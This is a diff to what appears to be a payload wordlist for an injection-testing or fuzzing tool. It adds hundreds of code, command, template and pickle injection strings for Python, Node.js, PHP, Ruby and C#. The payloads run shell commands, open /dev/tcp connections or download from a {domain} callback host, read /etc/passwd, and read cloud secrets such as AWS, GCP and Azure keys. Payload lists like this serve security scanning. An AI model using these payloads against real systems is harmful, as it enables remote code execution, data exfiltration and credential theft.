@@ -538,98 +538,431 @@ ${{<%[%'\"}}%\\
 --version
 -h
 --help
++++ATH0
 $USER
-#{\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder[\\\"(java.lang.String[])\\\"]([\\\"\/bin\/sh\\\",\\\"-c\\\",\\\"nslookup {domain}\\\"]).start()\")}
-#{''.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval('new java.lang.ProcessBuilder[\\'(java.lang.String[])\\']([\\'\/bin\/sh\\',\\'-c\\',\\'nslookup {domain}\\']).start()')}
+--use-compress-program=nslookup {domain} -domain=a.jpg
 $(ping {domain})
-$_GET['\/bin\/bash -c \\\"true > \/dev\/tcp\/{domain}\/80\\\"']
-$_GET['\/bin\/sh -c \\\"true > \/dev\/tcp\/{domain}\/80\\\"']
-$_GET['certutil -urlcache -f \\\"http:\/\/{domain}\\\"]
-$_GET['exec 6< \/dev\/tcp\/{domain}\/80']
-$_GET['id']
-$_GET['ping {domain}']
-$_GET['powershell -c (New-Object Net.WebClient).DownloadString(\\\"http:\/\/{domain}\\\")']
-$_GET['powershell -c Invoke-WebRequest \\\"http:\/\/{domain}\\\"']
-$_GET['printenv']
-$_GET['sleep 9']
-${\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder[\\\"(java.lang.String[])\\\"]([\\\"\/bin\/sh\\\",\\\"-c\\\",\\\"nslookup {domain}\\\"]).start()\")}
-${''.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval('new java.lang.ProcessBuilder[\\'(java.lang.String[])\\']([\\'\/bin\/sh\\',\\'-c\\',\\'nslookup {domain}\\']).start()')}
-%x('printenv \/')
-($_GET['\/bin\/bash -c \\\"true > \/dev\/tcp\/{domain}\/80\\\"']);
-($_GET['\/bin\/sh -c \\\"true > \/dev\/tcp\/{domain}\/80\\\"']);
-($_GET['certutil -urlcache -f \\\"http:\/\/{domain}\\\"']);
-($_GET['exec 6< \/dev\/tcp\/{domain}\/80']);
-($_GET['id']);
-($_GET['ping {domain}']);
-($_GET['powershell -c (New-Object Net.WebClient).DownloadString(\\\"http:\/\/{domain}\\\")']);
-($_GET['powershell -c Invoke-WebRequest \\\"http:\/\/{domain}\\\"']);
-($_GET['printenv']);
-($_GET['sleep 9']);
 () { 0; }; ping {domain};
 () { _; } >_[$($())] { ping {domain}; }
-+++ATH0
---use-compress-program=nslookup {domain} -domain=a.jpg
 \/dev\/null; ping {domain} ; echo
+@{[system \"ping {domain}\"]}
+<<< %s(un='%s') = %u
+%x('printenv \/')
+(666*666)
+abs(-443556)
+__import__(\"time\").sleep(9)
+__import__(\"subprocess\").getoutput(\"id\")
+__import__(\"subprocess\").getoutput(\"net user\")
+__import__(\"subprocess\").getoutput(\"printenv\")
+__import__(\"subprocess\").getoutput(\"set\")
+__import__(\"urllib.request\").request.urlopen(\"http:\/\/{domain}\")
+__import__(\"urllib.request\").request.urlopen(\"https:\/\/{domain}\")
+__import__(\"subprocess\").getoutput(\"\/bin\/bash -c \\\"true > \/dev\/tcp\/{domain}\/80 \\\"\")
+__import__(\"subprocess\").getoutput(\"certutil -urlcache -f 'http:\/\/{domain}'\"\")
+__import__(\"os\").system(\"\/bin\/bash -c 'true > \/dev\/tcp\/{domain}\/80'\")
+__import__(\"os\").system(\"exec 6< \/dev\/tcp\/{domain}\/80\")
+__import__(\"os\").system(\"certutil -urlcache -f 'http:\/\/{domain}'\")
+__import__(\"os\").system(\"exec 6< \/dev\/tcp\/{domain}\/80\")
+__import__(\"os\").system(\"ping {domain} -c 2\")
+__import__(\"os\").system(\"powershell -c (New-Object Net.WebClient).DownloadString('http:\/\/{domain}')\")
+__import__(\"os\").system(\"powershell -c Invoke-WebRequest 'http:\/\/{domain}'\")
+__import__(\"os\").uname()
+__import__(\"os\").environ[\"HOME\"]
+__import__(\"os\").environ[\"PATH\"]
+__import__(\"os\").environ[\"Path\"]
+__import__(\"os\").environ[\"PWD\"]
+__import__(\"os\").environ[\"HOSTNAME\"]
+__import__(\"os\").environ[\"USERNAME\"]
+__import__(\"os\").environ[\"OS\"]
+__import__(\"os\").environ[\"AWS_ACCESS_KEY_ID\"]
+__import__(\"os\").environ[\"AWS_SECRET_ACCESS_KEY\"]
+__import__(\"os\").environ[\"AWS_SESSION_TOKEN\"]
+__import__(\"os\").environ[\"EC2_TOKEN\"]
+__import__(\"os\").environ[\"AWS_CONTAINER_CREDENTIALS_RELATIVE_URI\"]
+__import__(\"os\").environ[\"GCP_PROJECT\"]
+__import__(\"os\").environ[\"COMPOSER_GKE_NAME\"]
+__import__(\"os\").environ[\"GOOGLE_APPLICATION_CREDENTIALS\"]
+__import__(\"os\").environ[\"AZURE_TENANT_ID\"]
+__import__(\"os\").environ[\"AZURE_CLIENT_ID\"]
+__import__(\"os\").environ[\"AZURE_CLIENT_SECRET\"]
+__import__(\"os\").environ[\"AZURE_USERNAME\"]
+__import__(\"os\").environ[\"AZURE_PASSWORD\"]
+eval(\"666*666\")
+eval(\"(666*666)\")
+eval(\"abs(-443556)\")
+eval(\"__import__(\\\"time\\\").sleep(9)\")
+eval(\"__import__(\\\"subprocess\\\").getoutput(\\\"id\\\")\")
+eval(\"__import__(\\\"subprocess\\\").getoutput(\\\"net user\\\")\")
+eval(\"__import__(\\\"subprocess\\\").getoutput(\\\"printenv\\\")\")
+eval(\"__import__(\\\"subprocess\\\").getoutput(\\\"set\\\")\")
+eval(\"__import__(\\\"urllib.request\\\").request.urlopen(\\\"http:\/\/{domain}\\\")\")
+eval(\"__import__(\\\"urllib.request\\\").request.urlopen(\\\"https:\/\/{domain}\\\")\")
+eval(\"__import__(\\\"subprocess\\\").getoutput(\\\"\/bin\/bash -c \\\\\"true > \/dev\/tcp\/{domain}\/80 \\\\\"\\\")\")
+eval(\"__import__(\\\"subprocess\\\").getoutput(\\\"certutil -urlcache -f \\'http:\/\/{domain}\\'\\\"\\\")\")
+eval(\"__import__(\\\"os\\\").system(\\\"\/bin\/bash -c \\'true > \/dev\/tcp\/{domain}\/80\\'\\\")\")
+eval(\"__import__(\\\"os\\\").system(\\\"exec 6< \/dev\/tcp\/{domain}\/80\\\")\")
+eval(\"__import__(\\\"os\\\").system(\\\"certutil -urlcache -f \\'http:\/\/{domain}\\'\\\")\")
+eval(\"__import__(\\\"os\\\").system(\\\"exec 6< \/dev\/tcp\/{domain}\/80\\\")\")
+eval(\"__import__(\\\"os\\\").system(\\\"ping {domain} -c 2\\\")\")
+eval(\"__import__(\\\"os\\\").system(\\\"powershell -c (New-Object Net.WebClient).DownloadString(\\'http:\/\/{domain}\\')\\\")\")
+eval(\"__import__(\\\"os\\\").system(\\\"powershell -c Invoke-WebRequest \\'http:\/\/{domain}\\'\\\")\")
+eval(\"__import__(\\\"os\\\").uname()\")
+eval(\"__import__(\\\"os\\\").environ[\\\"HOME\\\"]\")
+eval(\"__import__(\\\"os\\\").environ[\\\"PATH\\\"]\")
+eval(\"__import__(\\\"os\\\").environ[\\\"Path\\\"]\")
+eval(\"__import__(\\\"os\\\").environ[\\\"PWD\\\"]\")
+eval(\"__import__(\\\"os\\\").environ[\\\"HOSTNAME\\\"]\")
+eval(\"__import__(\\\"os\\\").environ[\\\"USERNAME\\\"]\")
+eval(\"__import__(\\\"os\\\").environ[\\\"OS\\\"]\")
+eval(\"__import__(\\\"os\\\").environ[\\\"AWS_ACCESS_KEY_ID\\\"]\")
+eval(\"__import__(\\\"os\\\").environ[\\\"AWS_SECRET_ACCESS_KEY\\\"]\")
+eval(\"__import__(\\\"os\\\").environ[\\\"AWS_SESSION_TOKEN\\\"]\")
+eval(\"__import__(\\\"os\\\").environ[\\\"EC2_TOKEN\\\"]\")
+eval(\"__import__(\\\"os\\\").environ[\\\"AWS_CONTAINER_CREDENTIALS_RELATIVE_URI\\\"]\")
+eval(\"__import__(\\\"os\\\").environ[\\\"GCP_PROJECT\\\"]\")
+eval(\"__import__(\\\"os\\\").environ[\\\"COMPOSER_GKE_NAME\\\"]\")
+eval(\"__import__(\\\"os\\\").environ[\\\"GOOGLE_APPLICATION_CREDENTIALS\\\"]\")
+eval(\"__import__(\\\"os\\\").environ[\\\"AZURE_TENANT_ID\\\"]\")
+eval(\"__import__(\\\"os\\\").environ[\\\"AZURE_CLIENT_ID\\\"]\")
+eval(\"__import__(\\\"os\\\").environ[\\\"AZURE_CLIENT_SECRET\\\"]\")
+eval(\"__import__(\\\"os\\\").environ[\\\"AZURE_USERNAME\\\"]\")
+eval(\"__import__(\\\"os\\\").environ[\\\"AZURE_PASSWORD\\\"]\")
+666*666
+(666*666)
+Math.abs(-443556)
+require('child_process').execSync(`sleep 9`).toString();
+require('child_process').execSync(`timeout 9`).toString();
+require('child_process').execSync(`id`).toString();
+require('child_process').execSync(`net user`).toString();
+require('child_process').execSync(`printenv`).toString();
+require('child_process').execSync(`set`).toString();
+http.get('http:\/\/{domain}')
+https.get('https:\/\/{domain}')
+require('http').get('http:\/\/{domain}')
+require('https').get('https:\/\/{domain}')
+require('child_process').execSync(`\/bin\/bash -c 'true > \/dev\/tcp\/{domain}\/80'`).toString();
+require('child_process').execSync(`exec 6< \/dev\/tcp\/{domain}\/80`).toString();
+require('child_process').execSync(`certutil -urlcache -f 'http:\/\/{domain}'`).toString();
+require('child_process').execSync(`exec 6< \/dev\/tcp\/{domain}\/80`).toString();
+require('child_process').execSync(`ping {domain} -c 2`).toString();
+require('child_process').execSync(`powershell -c (New-Object Net.WebClient).DownloadString('http:\/\/{domain}')`).toString();
+require('child_process').execSync(`powershell -c Invoke-WebRequest 'http:\/\/{domain}'`).toString();
+process.env.HOME
+process.env.PATH
+process.env.Path
+process.env.PWD
+process.env.HOSTNAME
+process.env.USERNAME
+process.env.OS
+process.env.AWS_ACCESS_KEY_ID
+process.env.AWS_SECRET_ACCESS_KEY
+process.env.AWS_SESSION_TOKEN
+process.env.EC2_TOKEN
+process.env.AWS_CONTAINER_CREDENTIALS_RELATIVE_URI
+process.env.GCP_PROJECT
+process.env.COMPOSER_GKE_NAME
+process.env.GOOGLE_APPLICATION_CREDENTIALS
+process.env.AZURE_TENANT_ID
+process.env.AZURE_CLIENT_ID
+process.env.AZURE_CLIENT_SECRET
+process.env.AZURE_USERNAME
+process.env.AZURE_PASSWORD
+eval(666*666)
+eval((666*666))
+eval(Math.abs(-443556))
+eval(require('child_process').execSync(`sleep 9`).toString();)
+eval(require('child_process').execSync(`timeout 9`).toString();)
+eval(require('child_process').execSync(`id`).toString();)
+eval(require('child_process').execSync(`net user`).toString();)
+eval(require('child_process').execSync(`printenv`).toString();)
+eval(require('child_process').execSync(`set`).toString();)
+eval(http.get('http:\/\/{domain}'))
+eval(https.get('https:\/\/{domain}'))
+eval(require('http').get('http:\/\/{domain}'))
+eval(require('https').get('https:\/\/{domain}'))
+eval(require('child_process').execSync(`\/bin\/bash -c 'true > \/dev\/tcp\/{domain}\/80'`).toString();)
+eval(require('child_process').execSync(`exec 6< \/dev\/tcp\/{domain}\/80`).toString();)
+eval(require('child_process').execSync(`certutil -urlcache -f 'http:\/\/{domain}'`).toString();)
+eval(require('child_process').execSync(`exec 6< \/dev\/tcp\/{domain}\/80`).toString();)
+eval(require('child_process').execSync(`ping {domain} -c 2`).toString();)
+eval(require('child_process').execSync(`powershell -c (New-Object Net.WebClient).DownloadString('http:\/\/{domain}')`).toString();)
+eval(require('child_process').execSync(`powershell -c Invoke-WebRequest 'http:\/\/{domain}'`).toString();)
+eval(process.env.HOME)
+eval(process.env.PATH)
+eval(process.env.Path)
+eval(process.env.PWD)
+eval(process.env.HOSTNAME)
+eval(process.env.USERNAME)
+eval(process.env.OS)
+eval(process.env.AWS_ACCESS_KEY_ID)
+eval(process.env.AWS_SECRET_ACCESS_KEY)
+eval(process.env.AWS_SESSION_TOKEN)
+eval(process.env.EC2_TOKEN)
+eval(process.env.AWS_CONTAINER_CREDENTIALS_RELATIVE_URI)
+eval(process.env.GCP_PROJECT)
+eval(process.env.COMPOSER_GKE_NAME)
+eval(process.env.GOOGLE_APPLICATION_CREDENTIALS)
+eval(process.env.AZURE_TENANT_ID)
+eval(process.env.AZURE_CLIENT_ID)
+eval(process.env.AZURE_CLIENT_SECRET)
+eval(process.env.AZURE_USERNAME)
+eval(process.env.AZURE_PASSWORD)
+666*666
+(666*666)
+abs(-443556)
+sleep(9)
+file_get_contents(\"http:\/\/{domain}\")
+curl_exec(curl_init(\"https:\/\/{domain}\"))
+exec(\"sleep 9\")
+exec(\"timeout 9\")
+exec(\"id\")
+exec(\"net user\")
+exec(\"printenv\")
+exec(\"set\")
+exec(\"\/bin\/bash -c 'true > \/dev\/tcp\/{domain}\/80'\")
+exec(\"exec 6< \/dev\/tcp\/{domain}\/80\")
+exec(\"certutil -urlcache -f 'http:\/\/{domain}'\")
+exec(\"exec 6< \/dev\/tcp\/{domain}\/80\")
+exec(\"ping {domain} -c 2\")
+exec(\"powershell -c (New-Object Net.WebClient).DownloadString('http:\/\/{domain}')\")
+exec(\"powershell -c Invoke-WebRequest 'http:\/\/{domain}'\")
+shell_exec(\"sleep 9\")
+shell_exec(\"timeout 9\")
+shell_exec(\"id\")
+shell_exec(\"net user\")
+shell_exec(\"printenv\")
+shell_exec(\"set\")
+shell_exec(\"\/bin\/bash -c 'true > \/dev\/tcp\/{domain}\/80'\")
+shell_exec(\"exec 6< \/dev\/tcp\/{domain}\/80\")
+shell_exec(\"certutil -urlcache -f 'http:\/\/{domain}'\")
+shell_exec(\"exec 6< \/dev\/tcp\/{domain}\/80\")
+shell_exec(\"ping {domain} -c 2\")
+shell_exec(\"powershell -c (New-Object Net.WebClient).DownloadString('http:\/\/{domain}')\")
+shell_exec(\"powershell -c Invoke-WebRequest 'http:\/\/{domain}'\")
+getenv(HOME)
+getenv(PATH)
+getenv(Path)
+getenv(PWD)
+getenv(HOSTNAME)
+getenv(USERNAME)
+getenv(OS)
+getenv(AWS_ACCESS_KEY_ID)
+getenv(AWS_SECRET_ACCESS_KEY)
+getenv(AWS_SESSION_TOKEN)
+getenv(EC2_TOKEN)
+getenv(AWS_CONTAINER_CREDENTIALS_RELATIVE_URI)
+getenv(GCP_PROJECT)
+getenv(COMPOSER_GKE_NAME)
+getenv(GOOGLE_APPLICATION_CREDENTIALS)
+getenv(AZURE_TENANT_ID)
+getenv(AZURE_CLIENT_ID)
+getenv(AZURE_CLIENT_SECRET)
+getenv(AZURE_USERNAME)
+getenv(AZURE_PASSWORD)
+eval(\"echo 666*666;\");
+eval(\"echo (666*666);\");
+eval(\"echo abs(-443556);\");
+eval(\"echo sleep(9);\");
+eval(\"echo file_get_contents(\\\"http:\/\/{domain}\\\");\");
+eval(\"echo curl_exec(curl_init(\\\"https:\/\/{domain}\\\"));\");
+eval(\"echo exec(\\\"sleep 9\\\");\");
+eval(\"echo exec(\\\"timeout 9\\\");\");
+eval(\"echo exec(\\\"id\\\");\");
+eval(\"echo exec(\\\"net user\\\");\");
+eval(\"echo exec(\\\"printenv\\\");\");
+eval(\"echo exec(\\\"set\\\");\");
+eval(\"echo exec(\\\"\/bin\/bash -c \\'true > \/dev\/tcp\/{domain}\/80\\'\\\");\");
+eval(\"echo exec(\\\"exec 6< \/dev\/tcp\/{domain}\/80\\\");\");
+eval(\"echo exec(\\\"certutil -urlcache -f \\'http:\/\/{domain}\\'\\\");\");
+eval(\"echo exec(\\\"exec 6< \/dev\/tcp\/{domain}\/80\\\");\");
+eval(\"echo exec(\\\"ping {domain} -c 2\\\");\");
+eval(\"echo exec(\\\"powershell -c (New-Object Net.WebClient).DownloadString(\\'http:\/\/{domain}\\')\\\");\");
+eval(\"echo exec(\\\"powershell -c Invoke-WebRequest \\'http:\/\/{domain}\\'\\\");\");
+eval(\"echo shell_exec(\\\"sleep 9\\\");\");
+eval(\"echo shell_exec(\\\"timeout 9\\\");\");
+eval(\"echo shell_exec(\\\"id\\\");\");
+eval(\"echo shell_exec(\\\"net user\\\");\");
+eval(\"echo shell_exec(\\\"printenv\\\");\");
+eval(\"echo shell_exec(\\\"set\\\");\");
+eval(\"echo shell_exec(\\\"\/bin\/bash -c \\'true > \/dev\/tcp\/{domain}\/80\\'\\\");\");
+eval(\"echo shell_exec(\\\"exec 6< \/dev\/tcp\/{domain}\/80\\\");\");
+eval(\"echo shell_exec(\\\"certutil -urlcache -f \\'http:\/\/{domain}\\'\\\");\");
+eval(\"echo shell_exec(\\\"exec 6< \/dev\/tcp\/{domain}\/80\\\");\");
+eval(\"echo shell_exec(\\\"ping {domain} -c 2\\\");\");
+eval(\"echo shell_exec(\\\"powershell -c (New-Object Net.WebClient).DownloadString(\\'http:\/\/{domain}\\')\\\");\");
+eval(\"echo shell_exec(\\\"powershell -c Invoke-WebRequest \\'http:\/\/{domain}\\'\\\");\");
+eval(\"echo getenv(HOME);\");
+eval(\"echo getenv(PATH);\");
+eval(\"echo getenv(Path);\");
+eval(\"echo getenv(PWD);\");
+eval(\"echo getenv(HOSTNAME);\");
+eval(\"echo getenv(USERNAME);\");
+eval(\"echo getenv(OS);\");
+eval(\"echo getenv(AWS_ACCESS_KEY_ID);\");
+eval(\"echo getenv(AWS_SECRET_ACCESS_KEY);\");
+eval(\"echo getenv(AWS_SESSION_TOKEN);\");
+eval(\"echo getenv(EC2_TOKEN);\");
+eval(\"echo getenv(AWS_CONTAINER_CREDENTIALS_RELATIVE_URI);\");
+eval(\"echo getenv(GCP_PROJECT);\");
+eval(\"echo getenv(COMPOSER_GKE_NAME);\");
+eval(\"echo getenv(GOOGLE_APPLICATION_CREDENTIALS);\");
+eval(\"echo getenv(AZURE_TENANT_ID);\");
+eval(\"echo getenv(AZURE_CLIENT_ID);\");
+eval(\"echo getenv(AZURE_CLIENT_SECRET);\");
+eval(\"echo getenv(AZURE_USERNAME);\");
+eval(\"echo getenv(AZURE_PASSWORD);\");
+666*666
+(666*666)
+-443556.abs
+sleep(9)
+require 'net\/http'; puts Net::HTTP.get(URI('http:\/\/{domain}'))
+require 'net\/http'; puts Net::HTTP.get(URI('https:\/\/{domain}'))
+`sleep 9`
+`timeout 9`
+`id`
+`net user`
+`printenv`
+`set`
+`\/bin\/bash -c 'true > \/dev\/tcp\/{domain}\/80'`
+`exec 6< \/dev\/tcp\/{domain}\/80`
+`certutil -urlcache -f 'http:\/\/{domain}'`
+`exec 6< \/dev\/tcp\/{domain}\/80`
+`ping {domain} -c 2`
+`powershell -c (New-Object Net.WebClient).DownloadString('http:\/\/{domain}')`
+`powershell -c Invoke-WebRequest 'http:\/\/{domain}'`
+exec(\"sleep 9\")
+exec(\"timeout 9\")
+exec(\"id\")
+exec(\"net user\")
+exec(\"printenv\")
+exec(\"set\")
+exec(\"\/bin\/bash -c 'true > \/dev\/tcp\/{domain}\/80'\")
+exec(\"exec 6< \/dev\/tcp\/{domain}\/80\")
+exec(\"certutil -urlcache -f 'http:\/\/{domain}'\")
+exec(\"exec 6< \/dev\/tcp\/{domain}\/80\")
+exec(\"ping {domain} -c 2\")
+exec(\"powershell -c (New-Object Net.WebClient).DownloadString('http:\/\/{domain}')\")
+exec(\"powershell -c Invoke-WebRequest 'http:\/\/{domain}'\")
+system(\"sleep 9\")
+system(\"timeout 9\")
+system(\"id\")
+system(\"net user\")
+system(\"printenv\")
+system(\"set\")
+system(\"\/bin\/bash -c 'true > \/dev\/tcp\/{domain}\/80'\")
+system(\"exec 6< \/dev\/tcp\/{domain}\/80\")
+system(\"certutil -urlcache -f 'http:\/\/{domain}'\")
+system(\"exec 6< \/dev\/tcp\/{domain}\/80\")
+system(\"ping {domain} -c 2\")
+system(\"powershell -c (New-Object Net.WebClient).DownloadString('http:\/\/{domain}')\")
+system(\"powershell -c Invoke-WebRequest 'http:\/\/{domain}'\")
+ENV.keys
+ENV[\"HOME\"]
+ENV[\"PATH\"]
+ENV[\"Path\"]
+ENV[\"PWD\"]
+ENV[\"HOSTNAME\"]
+ENV[\"USERNAME\"]
+ENV[\"OS\"]
+ENV[\"AWS_ACCESS_KEY_ID\"]
+ENV[\"AWS_SECRET_ACCESS_KEY\"]
+ENV[\"AWS_SESSION_TOKEN\"]
+ENV[\"EC2_TOKEN\"]
+ENV[\"AWS_CONTAINER_CREDENTIALS_RELATIVE_URI\"]
+ENV[\"GCP_PROJECT\"]
+ENV[\"COMPOSER_GKE_NAME\"]
+ENV[\"GOOGLE_APPLICATION_CREDENTIALS\"]
+ENV[\"AZURE_TENANT_ID\"]
+ENV[\"AZURE_CLIENT_ID\"]
+ENV[\"AZURE_CLIENT_SECRET\"]
+ENV[\"AZURE_USERNAME\"]
+ENV[\"AZURE_PASSWORD\"]
+eval(\"666*666\")
+eval(\"(666*666)\")
+eval(\"-443556.abs\")
+eval(\"sleep(9)\")
+eval(\"require \\'net\/http\\'; puts Net::HTTP.get(URI(\\'http:\/\/{domain}\\'))\")
+eval(\"require \\'net\/http\\'; puts Net::HTTP.get(URI(\\'https:\/\/{domain}\\'))\")
+eval(\"`sleep 9`\")
+eval(\"`timeout 9`\")
+eval(\"`id`\")
+eval(\"`net user`\")
+eval(\"`printenv`\")
+eval(\"`set`\")
+eval(\"`\/bin\/bash -c \\'true > \/dev\/tcp\/{domain}\/80\\'`\")
+eval(\"`exec 6< \/dev\/tcp\/{domain}\/80`\")
+eval(\"`certutil -urlcache -f \\'http:\/\/{domain}\\'`\")
+eval(\"`exec 6< \/dev\/tcp\/{domain}\/80`\")
+eval(\"`ping {domain} -c 2`\")
+eval(\"`powershell -c (New-Object Net.WebClient).DownloadString(\\'http:\/\/{domain}\\')`\")
+eval(\"`powershell -c Invoke-WebRequest \\'http:\/\/{domain}\\'`\")
+eval(\"exec(\\\"sleep 9\\\")\")
+eval(\"exec(\\\"timeout 9\\\")\")
+eval(\"exec(\\\"id\\\")\")
+eval(\"exec(\\\"net user\\\")\")
+eval(\"exec(\\\"printenv\\\")\")
+eval(\"exec(\\\"set\\\")\")
+eval(\"exec(\\\"\/bin\/bash -c \\'true > \/dev\/tcp\/{domain}\/80\\'\\\")\")
+eval(\"exec(\\\"exec 6< \/dev\/tcp\/{domain}\/80\\\")\")
+eval(\"exec(\\\"certutil -urlcache -f \\'http:\/\/{domain}\\'\\\")\")
+eval(\"exec(\\\"exec 6< \/dev\/tcp\/{domain}\/80\\\")\")
+eval(\"exec(\\\"ping {domain} -c 2\\\")\")
+eval(\"exec(\\\"powershell -c (New-Object Net.WebClient).DownloadString(\\'http:\/\/{domain}\\')\\\")\")
+eval(\"exec(\\\"powershell -c Invoke-WebRequest \\'http:\/\/{domain}\\'\\\")\")
+eval(\"system(\\\"sleep 9\\\")\")
+eval(\"system(\\\"timeout 9\\\")\")
+eval(\"system(\\\"id\\\")\")
+eval(\"system(\\\"net user\\\")\")
+eval(\"system(\\\"printenv\\\")\")
+eval(\"system(\\\"set\\\")\")
+eval(\"system(\\\"\/bin\/bash -c \\'true > \/dev\/tcp\/{domain}\/80\\'\\\")\")
+eval(\"system(\\\"exec 6< \/dev\/tcp\/{domain}\/80\\\")\")
+eval(\"system(\\\"certutil -urlcache -f \\'http:\/\/{domain}\\'\\\")\")
+eval(\"system(\\\"exec 6< \/dev\/tcp\/{domain}\/80\\\")\")
+eval(\"system(\\\"ping {domain} -c 2\\\")\")
+eval(\"system(\\\"powershell -c (New-Object Net.WebClient).DownloadString(\\'http:\/\/{domain}\\')\\\")\")
+eval(\"system(\\\"powershell -c Invoke-WebRequest \\'http:\/\/{domain}\\'\\\")\")
+eval(\"ENV.keys\")
+eval(\"ENV[\\\"HOME\\\"]\")
+eval(\"ENV[\\\"PATH\\\"]\")
+eval(\"ENV[\\\"Path\\\"]\")
+eval(\"ENV[\\\"PWD\\\"]\")
+eval(\"ENV[\\\"HOSTNAME\\\"]\")
+eval(\"ENV[\\\"USERNAME\\\"]\")
+eval(\"ENV[\\\"OS\\\"]\")
+eval(\"ENV[\\\"AWS_ACCESS_KEY_ID\\\"]\")
+eval(\"ENV[\\\"AWS_SECRET_ACCESS_KEY\\\"]\")
+eval(\"ENV[\\\"AWS_SESSION_TOKEN\\\"]\")
+eval(\"ENV[\\\"EC2_TOKEN\\\"]\")
+eval(\"ENV[\\\"AWS_CONTAINER_CREDENTIALS_RELATIVE_URI\\\"]\")
+eval(\"ENV[\\\"GCP_PROJECT\\\"]\")
+eval(\"ENV[\\\"COMPOSER_GKE_NAME\\\"]\")
+eval(\"ENV[\\\"GOOGLE_APPLICATION_CREDENTIALS\\\"]\")
+eval(\"ENV[\\\"AZURE_TENANT_ID\\\"]\")
+eval(\"ENV[\\\"AZURE_CLIENT_ID\\\"]\")
+eval(\"ENV[\\\"AZURE_CLIENT_SECRET\\\"]\")
+eval(\"ENV[\\\"AZURE_USERNAME\\\"]\")
+eval(\"ENV[\\\"AZURE_PASSWORD\\\"]\")
+cos%0Asystem%0A(S%27curl%20{domain}%27%0AtR.%0A
+cos%0Asystem%0A(S%27hostname%27%0AtR.%0A
+cos%0Asystem%0A(S%27ping%20-c%205%20127.0.0.1%27%0AtR.%0A
+cos%0Asystem%0A(S%27ping%20-c%205%20{domain}%27%0AtR.%0A
+cos%0Asystem%0A(S%27whoami%27%0AtR.%0A
+new System.Diagnostics.ProcessStartInfo(\"\/bin\/bash -c 'true > \/dev\/tcp\/{domain}\/80'\");
+new System.Diagnostics.ProcessStartInfo(\"\/bin\/sh -c 'true > \/dev\/tcp\/{domain}\/80'\");
+new System.Diagnostics.ProcessStartInfo(\"certutil -urlcache -f 'http:\/\/{domain}'\");
+new System.Diagnostics.ProcessStartInfo(\"exec 6< \/dev\/tcp\/{domain}\/80\");
+new System.Diagnostics.ProcessStartInfo(\"ping {domain}\");
+new System.Diagnostics.ProcessStartInfo(\"powershell -c (New-Object Net.WebClient).DownloadString('http:\/\/{domain}')\");
+new System.Diagnostics.ProcessStartInfo(\"powershell -c Invoke-WebRequest 'http:\/\/{domain}'\");
+new System.Diagnostics.ProcessStartInfo(\"timeout 9\");
+new System.Diagnostics.ProcessStartInfo(\"whoami\");
 :\"pwnd\".toString.constructor.call({},\"return global.process.mainModule.constructor._load('child_process').execSync('cat \/etc\/passwd').toString()\")()
 :\"pwnd\".toString.constructor.call({},\"return global.process.mainModule.constructor._load('child_process').execSync('ping {domain}').toString()\")()
-;Kernel.exec(\"printenv \/\");
-;Kernel.exit(1);
-;escapeshellcmd('\/bin\/bash -c \"true > \/dev\/tcp\/{domain}\/80\"');
-;escapeshellcmd('\/bin\/sh -c \"true > \/dev\/tcp\/{domain}\/80\"');
-;escapeshellcmd('certutil -urlcache -f \"http:\/\/{domain}\"');
-;escapeshellcmd('exec 6< \/dev\/tcp\/{domain}\/80');
-;escapeshellcmd('id');
-;escapeshellcmd('ping {domain} -c 2');
-;escapeshellcmd('powershell -c (New-Object Net.WebClient).DownloadString(\\\"http:\/\/{domain}\\\")');
-;escapeshellcmd('powershell -c Invoke-WebRequest \\\"http:\/\/{domain}\\\"');
-;escapeshellcmd('printenv');
-;escapeshellcmd('sleep 9');
-;exec('\/bin\/bash -c \"true > \/dev\/tcp\/{domain}\/80\"');
-;exec('\/bin\/sh -c \"true > \/dev\/tcp\/{domain}\/80\"');
-;exec('certutil -urlcache -f \"http:\/\/{domain}\"');
-;exec('exec 6< \/dev\/tcp\/{domain}\/80');
-;exec('id');
-;exec('ping {domain} -c 2');
-;exec('powershell -c (New-Object Net.WebClient).DownloadString(\\\"http:\/\/{domain}\\\")');
-;exec('powershell -c Invoke-WebRequest \\\"http:\/\/{domain}\\\"');
-;exec('printenv');
-;exec('sleep 9');
-;exit(1);
-;phpinfo();
-;shell_exec('\/bin\/bash -c \"true > \/dev\/tcp\/{domain}\/80\"');
-;shell_exec('\/bin\/sh -c \"true > \/dev\/tcp\/{domain}\/80\"');
-;shell_exec('certutil -urlcache -f \"http:\/\/{domain}\"');
-;shell_exec('exec 6< \/dev\/tcp\/{domain}\/80');
-;shell_exec('id');
-;shell_exec('ping {domain} -c 2');
-;shell_exec('powershell -c (New-Object Net.WebClient).DownloadString(\\\"http:\/\/{domain}\\\")');
-;shell_exec('powershell -c Invoke-WebRequest \\\"http:\/\/{domain}\\\"');
-;shell_exec('printenv');
-;shell_exec('sleep 9');
-;system('\/bin\/bash -c \"true > \/dev\/tcp\/{domain}\/80\"');
-;system('\/bin\/sh -c \"true > \/dev\/tcp\/{domain}\/80\"');
-;system('certutil -urlcache -f \"http:\/\/{domain}\"');
-;system('exec 6< \/dev\/tcp\/{domain}\/80');
-;system('id');
-;system('ping {domain} -c 2');
-;system('powershell -c (New-Object Net.WebClient).DownloadString(\\\"http:\/\/{domain}\\\")');
-;system('powershell -c Invoke-WebRequest \\\"http:\/\/{domain}\\\"');
-;system('printenv');
-;system('sleep 9');
-<<< %s(un='%s') = %u
-<?php system('\/bin\/bash -c \"true > \/dev\/tcp\/{domain}\/80\"'); ?>
-<?php system('\/bin\/sh -c \"true > \/dev\/tcp\/{domain}\/80\"'); ?>
-<?php system('certutil -urlcache -f \"http:\/\/{domain}\"'); ?>
-<?php system('exec 6< \/dev\/tcp\/{domain}\/80'); ?>
-<?php system('id'); ?>
-<?php system('ping {domain}'); ?>
-<?php system('powershell -c (New-Object Net.WebClient).DownloadString(\\\"http:\/\/{domain}\\\")'); ?>
-<?php system('powershell -c Invoke-WebRequest \\\"http:\/\/{domain}\\\"'); ?>
-<?php system('printenv'); ?>
-<?php system('sleep 9'); ?>
-@{[system \"ping {domain}\"]}
-Kernel.exec(\"printenv \/\")
-Kernel.exit(1)
